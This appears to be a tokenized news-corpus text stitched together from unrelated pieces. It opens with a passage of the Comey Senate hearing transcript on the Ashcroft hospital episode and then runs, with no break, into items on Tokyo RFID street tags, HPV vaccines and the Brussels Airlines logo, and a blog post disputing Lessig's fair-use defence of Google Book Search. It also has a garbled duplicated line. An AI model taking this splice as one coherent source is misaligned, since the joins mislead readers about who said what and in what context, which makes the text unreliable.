SCHUMER : OK .
And they made it clear that there was in this envelope an
authorization that they hoped Mr. Ashcroft -- Attorney General
Ashcroft would sign .
COMEY : In substance .
I do n't know exactly the words , but it was
clear that 's what the envelope was .
SCHUMER : And the attorney general was -- what was his condition ?
I mean , he had -- as I understand it , he had pancreatitis .
He was
very , very ill ; in critical condition , in fact .
COMEY : He was very ill .
I do n't know how the doctors graded his
condition .
This was -- this would have been his sixth day in
intensive care .
And as I said , I was shocked when I walked in the
room and very concerned as I tried to get him to focus .
SCHUMER : Right .
OK .
Let 's continue .
What happened after Mr. Gonzales and Card left ?
Did you have any
contact with them in the next little while ?
COMEY : While I was talking to Director Mueller , an agent came up
to us and said that I had an urgent call in the command center , which
was right next door .
They had Attorney General Ashcroft in a hallway
by himself and there was an empty room next door that was the command
center .
And he said it was Mr. Card wanting to speak to me .
COMEY : I took the call .
And Mr. Card was very upset and
demanded that I come to the White House immediately .
I responded that , after the conduct I had just witnessed , I would
not meet with him without a witness present .
He replied , " What conduct ?
We were just there to wish him well . "
And I said again , " After what I just witnessed , I will not meet
with you without a witness .
And I intend that witness to be the
solicitor general of the United States . "
SCHUMER : That would be Mr. Olson .
COMEY : Yes , sir .
Ted Olson .
" Until I can connect with Mr. Olson , I 'm not going to meet with
you . "
He asked whether I was refusing to come to the White House .
I
said , " No , sir , I 'm not .
I 'll be there .
I need to go back to the
Department of Justice first . "
And then I reached out through the command center for Mr. Olson ,
who was at a dinner party .
And Mr. Olson and the other leadership of
the Department of Justice immediately went to the department , where we
sat down together in a conference room and talked about what we were
going to do .
And about 11 o'clock that night -- this evening had started at
about 8 o'clock , when I was on my way home .
At 11 o'clock that night ,
Mr. Olson and I went to the White House together .
SCHUMER : Just before you get there , you told Mr. Card that you
were very troubled by the conduct from the White House room ( ph ) , and
that 's why you wanted Mr. Olson to accompany you .
Without giving any of the details -- which we totally respect in
terms of substance -- just tell me why .
What did you tell him that so
upset you ?
Or if you did n't tell him just tell us .
COMEY : I was very upset .
I was angry .
I thought I just
witnessed an effort to take advantage of a very sick man , who did not
have the powers of the attorney general because they had been
transferred to me .
I thought he had conducted himself , and I said to the attorney
general , in a way that demonstrated a strength I had never seen
before .
But still I thought it was improper .
And it was for that reason that I thought there ought to be
somebody with me if I 'm going to meet with Mr. Card .
SCHUMER : Can you tell us a little bit about the discussion at
the Justice Department when all of you convened ?
I guess it was that
night .
COMEY : I do n't think it 's appropriate for me to go into the
substance of it .
We discussed what to do .
I recall the associate
attorney general being there , the solicitor general , the assistant
attorney general in charge of the Office of Legal Counsel , senior
staff from the attorney general , senior staff of mine .
And we just --
I do n't want to reveal the substances of those ...
SCHUMER : I do n't want you to reveal the substance .
They all thought what you did -- what you were doing was the
right thing , I presume .
COMEY : I presume .
I did n't ask people .
But I felt like we were
a team , we all understood what was going on , and we were trying to do
what was best for the country and the Department of Justice .
But it
was a very hard night .
SCHUMER : OK .
And then did you meet with Mr. Card ?
COMEY : I did .
I went with Mr. Olson driving -- my security
detail drove us to the White House .
We went into the West Wing .
Mr.
Card would not allow Mr. Olson to enter his office .
He asked Mr.
Olson to please sit outside in his sitting area .
I relented and went
in to meet with Mr. Card alone .
We met , had a discussion , which was
much more -- much calmer than the discussion on the telephone .
After --
I do n't remember how long , 10 or 15 minutes -- Mr.
Gonzales arrived and brought Mr. Olson into the room .
And the four of
us had a discussion .
SCHUMER : OK .
And was Mr. -- were you and Mr. Card still in a state of anger at
one another at that meeting , or is it a little calmer , and why ?
COMEY : Not that we showed .
SCHUMER : Right .
COMEY : It was much more civil than our phone conversation , much
calmer .
SCHUMER : Why ?
Why do you think ?
COMEY : I do n't know .
I mean , I had calmed down a little bit .
I 'd had a chance to talk to the people I respected .
Ted Olson I
respect enormously .
SCHUMER : Right .
OK .
Was there any discussion of resignations with Mr. Card ?
COMEY : Mr. Card was concerned that he had heard reports that
there were to be a large number of resignations at the Department of
Justice .
SCHUMER : OK .
OK .
And the conversations , the issue , whatever it was , was not
resolved .
COMEY : Correct .
We communicated about it .
I communicated again
the Department of Justice 's view on the matter .
And that was it .
SCHUMER : Right .
And you stated that the next day , Thursday , was the deadline for
reauthorization of the program , is that right ?
COMEY : Yes , sir .
SCHUMER : OK .
Can you tell us what happened the next day ?
COMEY : The program was reauthorized without us and without a
signature from the Department of Justice attesting as to its legality .
And I prepared a letter of resignation , intending to resign the next
day , Friday , March the 12th .
SCHUMER : OK .
And that was the day , as I understand it , of the Madrid train
bombings .
COMEY : Thursday , March 11th , was the morning of the Madrid train
bombings .
SCHUMER : And so , obviously , people were very concerned with all
of that .
COMEY : Yes .
It was a very busy day in the counterterrorism
aspect .
SCHUMER : Yet , even in light of that , you still felt so strongly
that you drafted a letter of resignation .
COMEY : Yes .
SCHUMER : OK .
And why did you decide to resign ?
COMEY : I just believed ...
SCHUMER : Or to offer your resignation , is a better way to put
it ?
COMEY : I believed that I could n't -- I could n't stay , if the
administration was going to engage in conduct that the Department of
Justice had said had no legal basis .
I just simply could n't stay .
SCHUMER : Right .
OK .
Now , let me just ask you this .
And this obviously is all
troubling .
As I understand it , you believed that others were also prepared
to resign , not just you , is that correct ?
COMEY : Yes .
SCHUMER : OK .
Was one of those Director Mueller ?
COMEY : I believe so .
You 'd have to ask him , but I believe so .
SCHUMER : You had conversations with him about it .
COMEY : Yes .
SCHUMER : OK .
How about the associate attorney general , Robert McCallum ?
COMEY : I do n't know .
We did n't discuss it .
SCHUMER : How about your chief of staff ?
COMEY : Yes .
He was certainly going to go when I went .
SCHUMER : Right .
How about Mr. Ashcroft 's chief of staff ?
COMEY : My understanding was that he would go as well .
SCHUMER : And how ...
COMEY : I should say ...
SCHUMER : Please .
COMEY : ... to make sure I 'm accurate , I ...
SCHUMER :
This is your surmise , not ...
COMEY : Yes .
I ended up agreeing -- Mr. Ashcroft 's chief of staff asked me
something that meant a great deal to him , and that is that I not
resign until Mr. Ashcroft was well enough to resign with me .
He was
very concerned that Mr. Ashcroft was not well enough to understand
fully what was going on .
And he begged me to wait until -- this was
Thursday that I was making this decision -- to wait til Monday to give
him the weekend to get oriented enough so that I would n't leave him
behind , was his concern .
SCHUMER : And it was his view that Mr. Ashcroft was likely to
resign as well ?
COMEY : Yes .
SCHUMER : So what did you do when you heard that ?
COMEY : I agreed to wait .
I said that what I would do is -- that
Friday would be last day .
And Monday morning I would resign .
SCHUMER : OK .
Anything else of significance relevant to this line of
questioning occur on Thursday the 11th , that you can recall ?
COMEY : No , not that I recall .
SCHUMER : Thank you .
Now , let 's go to the next day , which was March 12 .
Can you tell
us what happened then ?
COMEY : I went to the Oval Office -- as I did every morning as
acting attorney general -- with Director Mueller to brief the
president and the vice president on what was going on on Justice
Department 's counterterrorism work .
We had the briefing .
And as I was leaving , the president asked
to speak to me , took me in his study and we had a one - on - one meeting
for about 15 minutes -- again , which I will not go into the substance
of .
It was a very full exchange .
And at the end of that meeting , at
my urging , he met with Director Mueller , who was waiting for me
downstairs .
He met with Director Mueller again privately , just the two of
them .
And then after those two sessions , we had his direction to do
the right thing , to do what we ...
SCHUMER : Had the president 's direction to do the right thing ?
COMEY : Right .
We had the president 's direction to do what we believed , what the
Justice Department believed was necessary to put this matter on a
footing where we could certify to its legality .
And so we then set out to do that .
And we did that .
SCHUMER : OK .
So let me just ( inaudible ) -- this is an amazing story , has an
amazing pattern of fact that you recall .
SPECTER : Mr. Chairman , could you give us some idea when your
first round will conclude ?
SCHUMER : As soon as I ask a few questions here .
Fairly soon .
( OFF - MIKE )
SCHUMER : Yes .
And , Senator Specter , you will get the same amount of time .
SCHUMER : I thought with Mr. Comey 's telling what happened ...
( CROSSTALK )
SPECTER : Just may the record show that you 're now 16 minutes and
35 seconds over the five minutes and ...
SCHUMER : I think the record will show it .
SPECTER : Well , it does now .
( LAUGHTER )
SCHUMER : OK , thank you .
And I think most people would think that those 16:35 minutes were
worth hearing .
SPECTER : Well , Mr. Chairman , we do have such a thing as a second
round , and there are a lot of senators waiting ...
SCHUMER : Yes , OK .
Let me ask you these few questions ...
SPECTER : ... including a Republican .
SCHUMER : I 'm glad you 're here , Senator Specter .
I know you 're
concerned with the issue .
SPECTER : Lonely , but here .
( LAUGHTER )
SCHUMER : Let me ask you this :
So in sum , it was your belief
that Mr. Gonzales and Mr. Card were trying to take advantage of an ill
and maybe disoriented man to try and get him to do something that
many , at least in the Justice Department , thought was against the law ?
Was that a correct summation ?
COMEY : I was concerned that this was an effort to do an end-run
around the acting attorney general and to get a very sick man to
approve something that the Department of Justice had already concluded
-- the department as a whole -- was unable to be certified as to its
legality .
And that was my concern .
SCHUMER : OK .
And you also believe -- and you had later conversations with
Attorney General Ashcroft when he recuperated , and he backed your
view ?
COMEY : Yes , sir .
SCHUMER : Did you ever ask him explicitly if he would have
resigned had it come to that ?
COMEY : No .
SCHUMER : OK .
But he backed your view over that what was being done , or what
was attempting to being done , going around what you had recommended ,
was wrong , against the law ?
COMEY : Yes .
And I already knew his view from the hour we had spent together
going over it in great detail a week before the hospital incident .
SCHUMER : Yes .
And the FBI director , Mueller , backed your view over that of Mr .
Gonzales as well -- is that right ? -- in terms of whether the program
could continue to be implemented the way Counsel Gonzales wanted it to
be .
COMEY : The only reason I hesitate is it was never Director
Mueller 's job or position to be drawing a legal conclusion about the
program ; that he was very supportive to me personally .
He 's one of
the finest people I 've ever met and was a great help to me when I felt
a tremendous amount of pressure and felt a bit alone at the Department
of Justice .
But it was not his role to opine on the legality .
SCHUMER : How about Jack Goldsmith , the head of the Office of
Legal Counsel ?
Did he opine on the legality ?
COMEY : Yes .
He had done a substantial amount of work on that
issue .
And it was largely OLC , the Office of Legal Counsel 's work ,
that I was relying upon in drawing my -- in making my decision .
SCHUMER : OK .
Just two other questions .
Have you ever had the opportunity to recall these events on the
record in any other forum ?
COMEY : No .
SCHUMER : OK .
And ...
COMEY : I should ...
SCHUMER : Go ahead .
COMEY : I was interviewed by the FBI and discussed these events
in connection with a leak investigation the FBI was conducting .
SCHUMER : And you gave them these details then .
COMEY : Yes .
SCHUMER : Thank you .
COMEY : But not -- by forum I 've never testified about it .
SCHUMER : And after you stood your ground in March of 2004 , did
you suffer any recriminations or other problems at the department ?
COMEY : I did n't .
Not that I 'm aware of .
SCHUMER : OK .
Well , let me just say this , and then I 'll call on Senator Specter
who can have as much time as he thinks is appropriate .
The story is a shocking one .
It makes you almost gulp .
And I just want to say , speaking for myself , I appreciate your
integrity and fidelity to rule of law .
And I also appreciate Attorney
General Ashcroft 's fidelity to the rule of law as well , as well as the
men and women who worked with you and stuck by you in this .
When we have a situation where the laws of this country -- the
rules of law of this country are not respected because somebody thinks
there 's a higher goal , we run askew of the very purpose of what
democracy and rule of law are about .
SCHUMER : And this -- again , this story makes me gulp .

Amd this -- again , this story makes me gulp .

SPECTER : And as the acting attorney general , you were doing exactly what you should do in standing up for your authority and to stand by your guns and to do what you thought was right .
It has some characteristics of the Saturday Night Massacre , when the other officials stood up and they had to be fired in order to find someone who would -- deputy attorney general and others would not fire the special prosecutor .
So that was commendable .
When you finally got to the place where the buck does n't stop , when you got to the president -- as I understand your testimony -- the president told you to do what you thought was right .
Is that correct ?
COMEY : Yes , sir .
SPECTER : So the president backed you up .
And it was necessary to make changes in the terrorist surveillance program to get the requisite certification by the acting attorney general -- that is you ?
COMEY : And I may be being overly cautious , but I 'm not comfortable confirming what program it was that this related to .
And I should be clear .
The direction -- as I said , I met with the president first , the Director Mueller did .
COMEY : And it was Director Mueller who carried to me the president 's direction to do what the Department of Justice thinks is right to get this where the department believes it ought to be .
And we acted on that direction .
SPECTER : Director Mueller told you to -- the president said to do what you thought was right ?
COMEY : Correct .
SPECTER : Well , how about what the president himself told you ?
COMEY : I do n't want to get into what -- the reason I hesitate , Senator Specter , is the right thing was done here , in part -- in large part because the president let somebody like me and Bob Mueller meet with him alone .
And if I talk about that meeting , I worry that the next president who encounters this is not going to let the next me get close to them to talk about something this important .
So I 'm -- I want to be very careful that I do n't talk about what the president and I talked about .
I met with the president .
We had a full and frank discussion , very informed .
He was very focused .
Then Director Mueller met with the president alone .
I was n't there .
Director Mueller carried to me the president 's direction that we do what the Department of Justice wanted done to put this on a sound legal footing .
* * * *
SPECTER : And when you talked to White House Counsel Gonzales , did he try to pressure you to reverse your judgment ?
COMEY : No .
He disagreed , again , on the merits of the decision .
And we had engaged on that , had full discussions about that .
But he never tried to pressure me , other than to convince me that I was wrong .
SPECTER : Well , Mr. Comey , did you have discussions with anybody else in the administration who disagreed with your conclusions ?
COMEY : Yes , sir .
SPECTER : Who else ?
COMEY : Vice president .
SPECTER : Anybody else ?
COMEY : Members of his staff .
SPECTER : Who on his staff ?
COMEY : Mr. Addington disagreed with the conclusion .
And I 'm sure there were others who disagreed , but ...
SPECTER : Well , I do n't want to know who disagreed .
I want to know who told you they disagreed .
COMEY : OK .
SPECTER : Addington ?
COMEY : Mr. Addington .
The vice president told me that he disagreed .
I do n't remember any other White House officials telling me they disagreed .
SPECTER : OK .
So you 've got Card , Gonzales , Vice President Cheney and Addington who told you they disagreed with you .
COMEY : Yes , sir .
SPECTER : Did the vice president threaten you ?
COMEY : No , sir .
SPECTER : Did Addington threaten you ?
COMEY : No , sir .
SPECTER : So all these people told you they disagreed with you ?
Well , why in this context , when they say they disagreed with you and you 're standing by your judgment , would you consider resigning ?
You were acting attorney general .
They could fire you if they wanted to .
The president could replace you .
But why consider resigning ?
You had faced up to Card and Gonzales and Vice President Cheney and Addington , had a difference of opinion .
You were the acting attorney general , and that was that .
Why consider resigning ?
COMEY : Not because of the way I was treated but because I did n't believe that as the chief law enforcement officer in the country I could stay when they had gone ahead and done something that I had said I could find no legal basis for .
SPECTER :
When they said you could find no legal basis for ?
COMEY : I had reached a conclusion that I could not certify as ...
SPECTER : Well , all right , so you could not certify it , so you did not certify it .
But why resign ?
You 're standing up to those men .
You 're not going to certify it .
You 're the acting attorney general .
That 's that .
COMEY : Well , a key fact is that they went ahead and did it without -- the program was reauthorized without my signature and without the Department of Justice .
And so I believed that I could n't stay ...
SPECTER : Was the program reauthorized without the requisite certification by the attorney general or acting attorney general ?
COMEY : Yes .
SPECTER : So it went forward illegally .
COMEY : Well , that 's a complicated question .
It went forward without certification from the Department of Justice as to its legality .
SPECTER : But the certification by the Department of Justice as to legality was indispensable as a matter of law for the program to go forward , correct ?
COMEY : I believed so .
SPECTER : Then it was going forward illegally .
COMEY : Well , the only reason I hesitate is that I 'm no presidential scholar .
But if a determination was made by the head of the executive branch that some conduct was appropriate , that determination -- and lawful -- that determination was binding upon me , even though I was the acting attorney general , as I understand the law .
And so , I either had to go along with that or leave .
And I believed that I could n't stay -- and I think others felt this way as well -- that given that something was going forward that we had said we could not certify as to its legality .
SPECTER : Well , I can understand why you would feel compelled to resign in that context , once there had been made a decision by the executive branch , presumably by the president or by the president , because he was personally involved in the conversations , that you would resign because something was going forward which was illegal .
The point that I 'm trying to determine here is that it was going forward even though it was illegal .
COMEY : And I know I sound like I 'm splitting hairs , but ...
SPECTER : No , I do n't think there 's a hair there .
COMEY : Well , something was going forward without the Department of Justice 's certification as to its legality .
It 's a very complicated matter , and I 'm not going to go into what the program was or what the dimensions of the program ...
SPECTER : Well , you do n't have to .
If the certification by the Department of Justice as to legality is required as a matter of law , and that is not done , and the program goes forward , it 's illegal .
How can you -- how can you contest that , Mr. Comey ?
COMEY : The reason I hesitate is I do n't know that the Department of Justice 's certification was required by statute -- in fact , it was not , as far as I know -- or by regulation , but that it was the practice in this particular program , when it was renewed , that the attorney general sign off as to its legality .
There was a signature line for that .
And that was the signature line on which was adopted for me , as the acting attorney general , and that I would not sign .
So it was n't going forward in violation of any -- so far as I know -- statutory requirement that I sign off .
But it was going forward even though I had communicated , " I can not approve this as to its legality . "
And given that , I just -- I could n't , in good conscience , stay .
SPECTER : Well , Mr. Comey , on a matter of this importance , did n't you feel it necessary to find out if there was a statute which required your certification or a regulation which required your certification or something more than just a custom ?
COMEY : Yes , Senator .
And I ...
SPECTER : Did you make that determination ?
COMEY : Yes , and I may have understated my knowledge .
I 'm quite certain that there was n't a statute or regulation that required it , but that it was the way in which this matter had operated since the beginning .
I do n't --
I think the administration had sought the Department of Justice , the attorney general 's certification as to form and legality , but that I did n't know , and still do n't know , the source for that required in statute or regulation .
SPECTER : OK .
Then it was n't illegal .
COMEY : That 's why I hesitated when you used the word " illegal . "
SPECTER : Well , well , OK .
Now I want your legal judgment .
You are not testifying that it was illegal .
Now , as you 've explained that there 's no statute or regulation , but only a matter of custom , the conclusion is that even though it violated custom , it is not illegal .
It 's not illegal to violate custom , is it ?
COMEY : Not so far as I 'm aware .
SPECTER : OK .
So what the administration , executive branch of the president , did was not illegal .
COMEY : I 'm not saying -- again , that 's why I kept avoiding using that term .
I had not reached a conclusion that it was .
The only conclusion I reached is that I could not , after a whole lot of hard work , find an adequate legal basis for the program .
SPECTER : OK .
Well , now I understand why you did n't say it was illegal .
What I do n't understand is why you now wo n't say it was legal .
COMEY : Well , I suppose there 's an argument -- as I said , I 'm not a presidential scholar -- that because the head of the executive branch determined that it was appropriate to do , that that meant for purposes of those in the executive branch it was legal .
I disagreed with that conclusion .
Our legal analysis was that we could n't find an adequate legal basis for aspects of this matter .
And for that reason , I could n't certify it to its legality .
SPECTER : OK .
I will not ask you -- I have a rule never to ask the same question more than four times ... ( LAUGHTER ) ... so I will not ask you again whether necessarily from your testimony the conclusion is that what the president did was legal -- not illegal .
The Japanese love of technology is astonishing .
Every problem can be solved by throwing a little bit of gadgetry it 's way .
And so it is with street signs .
In Tokyo , there are virtually none , and those you can find are illegible to Gaijin .
Instead of doing the cheap and easy thing and putting up signs , the Japanese Government plans to tag every building with an RFID chip .
Citizens will carry readers , eventually in cellphones ( of course ) and can pinpoint their location , or view a map .
In a month long , ¥ 1 billion ( $ 8,350,000 ) trial in Tokyo's Ginza shopping district , PDAs were given to reporters and tourists .
The system has some very slick features already .
Exiting a subway , for example , you can check the screen and get a correctly oriented , 3D real time display of the area .
Privacy concerns are zero , as the tags cannot read any data , they simply identify places .
The system has already been hacked though .
A compatible tag was stuck to a lamp post and pointed users to a porn site .
It looks like this trial is to make it into a full city - wide operation , although it wo n't come cheap ;
The estimates come in at many trillions of Yen ( $ lots ) .

Both vaccines block the human papillomavirus Vaccinating all 12 - year - old girls against the virus which causes most cervical cancers could cut deaths from the disease by 75 % , a study suggests .
GlaxoSmithKline 's Cervarix jab targets two strains of the human papillomavirus .
The firm 's findings were presented at the International Papillomavirus Conference , along with a study on rival jab Gardasil from Sanofi Pasteur .
Gardasil was found to be effective on more strains of HPV than first thought .
The idea of finally being able to prevent cases of cervical cancer with a vaccine is extremely exciting
Dr Anne Szarewski , of Cancer Research UK
For the Cervarix research , a computer model was used to predict the outcome of vaccinating all 12 - year - old girls in the UK - a total of 376,385 .
Applied to the whole of the UK on the basis of the latest cervical cancer figures , it would mean 262 deaths each year , compared with the current level of around 1,000 .
The number of annual cases of the disease would also drop from 2,841 to 682 .
The researchers admitted 100 % coverage assumed in the study was unrealistic , but said even if 80 % were vaccinated , the number of deaths would drop by 61 % .
Cervarix works by targeting HPV 16 and HPV 18 , the two most common forms of the disease .
It has also been found to be effective at targeting some of the other most common strains .
Competition GSK is in fierce competition with Sanofi Pasteur , who are about to see their vaccine , Gardasil , granted a European licence .
Cervarix is still being developed and will not reach European approval stage for around another year .
The research into Gardasil , presented at the conference in Prague , the Czech Republic and funded by Sanofi Pasteur , found it provided protection against 85 % of HPV strains responsible for cervical cancer - up from 75 % shown by previous studies .
Dr Nick Kitchin , medical director at Sanofi Pasteur , said the results were " very promising " .
Dr Anne Szarewski , clinical consultant at Cancer Research UK , said : " HPV vaccination offers great promise in terms of reducing the number of cases of cervical cancer and preventing deaths from it .
" Beyond the cases and the deaths , hundreds of thousands of women each year in the UK suffer anxiety when they have an abnormal smear result .
" The idea of finally being able to prevent cases of cervical cancer with a vaccine is extremely exciting . "

Painters have been adding an extra dot to the airline 's logo
The 13 dots making up the stylised ' b ' brought a flood of complaints about the " unlucky " design .
The airline , which formally launches on 25 March , said it was taken aback by the strength of feeling and felt obliged to respond .
It has now altered the design to incorporate an additional dot .
Brussels Airlines was formed from the merger of SN Brussels Airlines and Virgin Express .
Brussels Airlines spokesman Geert Sciot said : " They [ passengers ] said they were not pleased with an aircraft with a logo with 13 balls because they think it brings them bad luck .
" We are never surprised by reactions - but that it was that bad ?
It really took us aback , " he said .
Lessig is Wrong
There 's a lawsuit under way with the Authors Guild and the American Association of Publishers suing Google Inc for massive copyright infringement .
There 's a lawsuit under way with the Authors Guild and the American Association of Publishers suing Google Inc for massive copyright infringement .
Oh , the echoes of the RIAA v MP3.com lawsuit ( full disclosure : I worked at MP3.com during that time period , and was part of the team that worked on the my .mp3.com service which was the basis for the RIAA 's suit ) .
Lawrence Lessig is arguing that Google Book Search qualifies as " fair use " as defined by 17 USC 107 .
The authors and publishers say , no way .
They say that Google is blatantly ripping off millions of books without first getting permission from ( read : paying ) the rights holders .
Given the way the RIAA v MP3.com case went , I side with the authors and the publishers , and I think Lessig is wrong .
In his nifty little video , Lessig makes two main points .
I question the validity of both of them .
Let 's start with the first one .
1 . The Kelly v Arriba Soft Corp Case
Lessig argues we should look at the judgement of this case when considering how the Google case should be decided .
In Kelly v Arriba , Arriba was sued for copyright infringement for an image search service similar to Google Images .
For details on the case , you could start here .
Lessig shows a screen shot from Google Images : and has this to say around 16 minutes into his video : " You can see that in this picture there are thumbnail versions of images that exist on other websites , and if you clicked one of these thumbnail images , you would be taken to that other website , and given the opportunity to see that full image on that other website .
There was no effort to copy the original image and store that either under the Arriba Soft case or in the Google case , instead this is simply a way to grant an index into images that are available elsewhere .
Now , the court said , what happened in this case is that the original copyrighted work had been reduced , so as to link to an image , a thumbnail image , linked to the original image .
So there was a transformation of the original copyrighted work by transforming it into a thumbnail .
That thumbnail itself was n't a substitution for the original copyrighted work , the quality of a thumbnail is so poor , no - one would use that instead of the original copyrighted work .
And all that the transformative work did was give you access to the original copyrighted work , in a way that protected and advanced the interest of the underlying copyright owner .
And that 's what grounded the claim for fair use , which the Arribasoft case ultimately held , protected the practice in that particular case .
" And so too , could you argue , is what Google doing protected by fair use , " says Lessig .
" Because what Google is doing here , is also producing a transformation of the original copyrighted work .
That transformation produces a reduced ' image ' in some sense , of the original copyrighted work , so again , here are the snippets : " and Lessig shows this image in his video when he says " snippets " :
He goes on to say this : " . . . here are the snippets that Google displays as a way to give you access to the original copyrighted work , once you see this reduced quality image , then you have the opportunity to link back to the original copyrighted work in a way that drives you to that original work .
The difference of course is that the work here is not on the computer , because we 're indexing books in physical space , whereas the works in the arribasoft case were on a computer somewhere , you could see the original work on the computer , but the principle that unites the two cases is that the transformation produces a reduced version of the original copyrighted work , itself not a substitute for the original work , but instead providing an advanced index or access to the original copyrighted work in a way that actually adds value back to the original copyrighted work .
That principle in both cases drives the conclusion that there should be " fair use " in both cases .
So this link to books is just like the link to images in the Arriba Soft case . "
And he shows an equation to nail home his point .
So .
Why do I disagree with this argument .
I disagree because Google is not making thumbnails of books .
Sure , I agree that Google is " transforming " the original copyrighted work .
But it sure as hell is n't doing it the same way that Arriba Soft saves thumbnail images of the original copyrighted images , and provides links to the websites where the original copyrighted images exist .
( This latter part is flawed as well , as we 'll see later . )
In Google 's case , they are clearly scanning in the original copyrighted pages of these books , no doubt using fairly high resolution digital photography , and then it seems they are using some sort of optical character recognition to transform the printed text on the page into a digital text on the computer .
On Google 's computer .
I have no idea if Google is OCRing and then running an indexer on the resulting body of text and then tossing the body of text and keeping the index .
I bet they 're not .
I bet they 're keeping the whole enchilada .
I mean , look at what Google 's doing .
Or must be doing : how would Google know where the words " Pioneer Life " appear in a bitmap image of the scanned book , unless they had scanned the book 's entirety , kept all the bitmap images , and recorded where the printed words in the image match up to the text words in the digitized OCR 'd body of text ?
That 's got to be some pretty fancy technology to do that .
Remember , Lessig said this above , " That thumbnail itself was n't a substitution for the original copyrighted work , the quality of a thumbnail is so poor , no - one would use that instead of the original copyrighted work . "
Ok , so one attribute of a thumbnail is poor quality , right ?
What happens if the quality is nearly as good as , if not BETTER , than the original ?
If you use advanced digital copying machines to photograph every single page of a book , including , ironically , its copyright page , and FAITHFULLY retain the original font , layout , and pagination of the book , you have to agree , it sure as hell is not a " thumbnail " , or " reduced " copy of the book .
Far from it .
If there 's any TRANSFORMATION going on with Google and books , it 's extracting the information from the book and storing it in its entirety in not just one , but multiple formats !
All without permission of the author , the publisher , or other rights holder .
But wait , one more thing before moving on to Lessig 's argument number two .
Lessig talks about the wonders of Google 's " snippets " -- see , they 're only " portions " , they 're clips !
Fair use !
Fair use !
Well , I do n't think so .
The " snippets " are clearly artificial .
Lessig likes to use a 1924 copyrighted book called True Stories of Pioneer Life to make his case .
He shows the little snippets in the image above .
But look closely at that screen shot .
It says " 136 references to " pioneer life " in the book .
How would Google know that ?
It would know that because it has the whole book digitized , both photographically and textually !
Do some other searches in this book .
For instance search for references to the word " corn " .
It finds 14 in the book , and shows you three snippets .
Search for " evening " .
It finds 16 references , and shows 3 snippets as teasers .
Search for " indian " .
9 references , 3 snippets .
And so on .
Google knows this book .
It knows it intimately .
And it is able to show you snippets that are photographic portions of the actual printed pages of the original copyrighted work , with the word reference highlighted right in the images itself .
Again , amazing technology , but forget the geekitude for a second .
This is not reductive transformation .
It 's expansive transformation .
Google is taking someone else 's work product and without their permission , copying it in multiple formats and letting people search on it .
I do n't deny it 's handy .
I just deny Google should be able to do it for free .
And one more thing .
Those " Buy this Book " links on Google Book Search results pages .
Who gets paid when Google sends the user to Abebooks or Alibris ?
Or Froogle ?
2 . 17 USC 107
Lessig 's second argument relies on his interpretation of 17 USC 107 , the section of copyright law pertaining to the concept of " fair use " .
Lessig reduces the text to a simple 1,2,3, 4 image , summarizing the law as having to do with work , use , amount , and markets .
Well , let 's look at the actual law : § 107 .
Limitations on exclusive rights : Fair use Notwithstanding the provisions of sections 106 and 106A , the fair use of a copyrighted work , including such use by reproduction in copies or phonorecords or by any other means specified by that section , for purposes such as criticism , comment , news reporting , teaching ( including multiple copies for classroom use ) , scholarship , or research , is not an infringement of copyright .
In determining whether the use made of a work in any particular case is a fair use the factors to be considered shall include 
(1 ) the purpose and character of the use , including whether such use is of a commercial nature or is for nonprofit educational purposes ;
( 2 ) the nature of the copyrighted work ;
(3 ) the amount and substantiality of the portion used in relation to the copyrighted work as a whole ; and
( 4 ) the effect of the use upon the potential market for or value of the copyrighted work .
The fact that a work is unpublished shall not itself bar a finding of fair use if such finding is made upon consideration of all the above factors .
Lessig focuses on his number four , " markets " .
Convenient , since I think a strong case can be made that what Google is doing is flat - out commercial in nature ( 1 ) ; that the nature of the copyrighted work is that it's a printed book and was intended to be just that , bought by a reader or library ( 2 ) ; and that it is outrageously clear that when it comes to the " amount and substantiality of the portion " of the books being copied , Google is exceeding the spirit of what the " fair use " principle expresses because , I mean come on , admit it man ! , Google is copying the whole document , and saving not only the visual PHOTOGRAPHIC copy of it , but a digital TEXT copy too !
This is way , WAY beyond " transformation " or " reduction " .
But Lessig focuses on his number four , " markets " .
He argues that the author and book publishing " market " has failed to invent something and so therefore do n't deserve to enjoy whatever benefits Google derives from its hard work .
Er , I mean , whatever Google derives from its copying of all those millions of authors ' years of hard work .
Or something .
Lessig says this ( at around 29 minutes 24 seconds into the video ) : " So here 's the choice the law presents us with .
If we recognize the right of the authors or the publishers to demand that Google get permission before Google has the right to index and make accessible that index to our past , then the authors and the publishers may get a few pennies for each work that 's within their collection , but at least 50 percent of our past will be lost .
50 % ca n't be within this index because there 's no author or publisher to ask .
50 % will be invisible to the world that looks to our past through the lens of digital technologies .
That 's the choice they 've forced us to make , and that 's the choice that the law of fair use must reckon when it decides whether this use by Google is ultimately ' fair use ' under the law of copyright . "
Now , as is his wont , he shows slides of words he 's speaking in the narration .
When he says the word " pennies " we see this in his video ( at 29 minutes 44 seconds ) :
Now , when I saw this image , I thought , gee , where did Google - fan - boy get this image from ?
If you look very closely , it has a copyright watermark at the top .
Check it out : " Copyright @ andipantz.com " .
Hmm , I thought .
I wonder where he got this .
Given Larry 's Google fandom , I figured it might be worth going to Google and doing a search for " pennies " .
Let 's do that , shall we ?
And then click on " images " .
To look at all those fair - use thumbnails of pennies , of course .
Well , well , well , what do we have here .
Click on the image , and we get :
Andrea K. Gingerich 's blog is what we get .
And her copyrighted photo that she 's entitled " Counting My Pennies " .
It 's dated August 30 , 2004 .
To be clear , the " Copyright ( c ) andipantz.com " is watermarked on Gingerich 's blog -- this is not a watermark that Lessig added .
In fact , as far as I could tell , ALL of Gingerich 's images on her blog have that watermark added somewhere in the image .
I wonder if Andrea Gingerich gave Professor Lessig permission to use that photograph in his widely - distributed Bittorrented movie ?
Apparently she did not .
At least , Andrea Gingerich tells me she did not .
She 's in Costa Rica at the moment , but still checking email . :-)
See , I emailed her and asked .
In fact , she thanked me for bringing it to her attention , and said she was going to fire off " a nice email " to Lessig directly .
But I digress .
Let 's get back to the points Lessig makes about market failure legitimizing Google 's activity .
Well , wait .
One thing .
Remember , he said this : " If we recognize the right of the authors or the publishers to demand that Google get permission before Google has the right to index and make accessible that index to our past , then the authors and the publishers may get a few pennies for each work that 's within their collection , but at least 50 percent of our past will be lost . "
Our past .
Our past .
WHOSE past , Google - boy ?
If someone writes a book , copyrights it , publishes it , sells it to the marketplace , how does that make it part of your or my past ?
Seems to me , copyright is copyright .
You got a beef with that , track down the copyright holder .
Oh , it 's impossible ?
Oh , it 's a pain .
Too bad .
It just takes a lot of time .
But someone somewhere is the copyright holder of that out - of - print book you so wish to copy .
Maybe Google Search will help you find the rights holder .
Stranger things have happened .
Remember , item ( 4 ) of 17 USC 107 says , " the effect of the use upon the potential market for or value of the copyrighted work . "
